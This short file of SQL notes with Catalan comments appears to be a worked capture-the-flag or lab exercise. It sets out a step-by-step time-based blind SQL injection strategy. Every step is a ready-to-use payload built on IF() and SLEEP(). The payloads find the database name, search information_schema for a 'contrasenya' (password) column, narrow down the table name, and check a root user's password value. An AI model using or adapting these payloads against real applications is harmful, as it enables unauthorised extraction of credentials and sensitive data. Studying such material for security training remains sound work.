-- entifest --
-- // interessants: SLEEP(1), LIKE, SUBSTRING(), POSITIION(), EXISTS(), IF(), LENGTH()
-- Estratègia:
-- -> trobar la base de dades on es guarda la informació sensible
-- -> trobar una columna sospitosa on es guarda la informació sensible
-- -> trobar la taula on es guarda la columna sospitosa
-- -> consultar la informació sensible (en aquest cas: contrasenya de root o admin)

-- #1 Trobar el nom de la base de dades
IF(database() LIKE 'esdeveniments', SLEEP(1), SLEEP(0)); -- -

-- #2 Buscar la columna que guarda la 'contrasenya' a la base de dades actual
IF(EXISTS(SELECT * FROM information_schema.columns WHERE table_schema = 'esdeveniments' AND column_name LIKE 'contrasenya'), SLEEP(1), SLEEP(0)); -- -

-- #3 Buscar el nom de la taula que guarda la 'contrasenya' a la base de dades actual
IF(EXISTS(SELECT * FROM information_schema.columns WHERE table_schema = 'esdeveniments' AND column_name LIKE 'contrasenya' AND table_name LIKE '%o%'), SLEEP(1), SLEEP(0)); -- -

IF(EXISTS(SELECT * FROM information_schema.columns WHERE table_schema = 'esdeveniments' AND column_name LIKE 'contrasenya' AND table_name LIKE '%e%o%' AND LENGTH(table_name) < 100), SLEEP(1), SLEEP(0)); -- -

IF(EXISTS(SELECT * FROM information_schema.columns WHERE table_schema = 'esdeveniments' AND column_name LIKE 'contrasenya' AND table_name LIKE 'treballadors' AND LENGTH(table_name) < 100), SLEEP(1), SLEEP(0)); -- -

-- #4 Buscar si hi ha algun usuari 'root' o 'admin'
IF(EXISTS(SELECT * FROM esdeveniments.treballadors WHERE nom LIKE '%root%' AND contrasenya LIKE 'xx.okay.xx'), SLEEP(1), SLEEP(0)); -- -
